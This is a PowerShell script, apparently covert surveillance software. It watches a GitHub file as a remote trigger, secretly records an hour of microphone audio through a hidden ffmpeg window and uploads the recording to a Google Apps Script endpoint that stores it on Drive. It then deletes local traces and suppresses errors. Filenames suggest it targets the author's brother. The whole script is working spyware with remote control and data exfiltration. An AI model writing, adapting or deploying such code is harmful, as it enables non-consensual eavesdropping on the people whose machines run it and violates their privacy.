# blague_audio_windows.ps1
# Surveille GitHub. Quand record_audio=true -> enregistre 60min via ffmpeg -> envoie au Apps Script -> Drive.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$FfmpegExe  = Join-Path $PSScriptRoot "ffmpeg.exe"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-AudioSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_audio.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ record_audio = [bool]$data.record_audio; sha = $resp.sha }
    } catch { return $null }
}

function Reset-AudioSignal($sha) {
    try {
        $body = @{
            message = "reset audio signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"record_audio":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_audio.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Send-AudioRecording {
    $filename = "audio_frere_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').mp3"
    $tempPath = Join-Path $env:TEMP $filename

    # Enregistrement 60 minutes via ffmpeg
    $proc = Start-Process -FilePath $FfmpegExe `
        -ArgumentList "-f dshow -i audio=`"$($config.mic_name)`" -t 3600 -q:a 5 -y `"$tempPath`"" `
        -Wait -PassThru -WindowStyle Hidden

    if (-not (Test-Path $tempPath)) { return }

    # Envoi au Apps Script Web App -> Google Drive
    try {
        $bytes = [IO.File]::ReadAllBytes($tempPath)
        $b64   = [Convert]::ToBase64String($bytes)
        $body  = @{ type = 'audio'; audio = $b64; filename = $filename } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}

    Remove-Item $tempPath -ErrorAction SilentlyContinue
}

# Boucle principale
while ($true) {
    $signal = Get-AudioSignal
    if ($signal -and $signal.record_audio) {
        Reset-AudioSignal $signal.sha
        Send-AudioRecording
    }
    Start-Sleep -Seconds 3
}
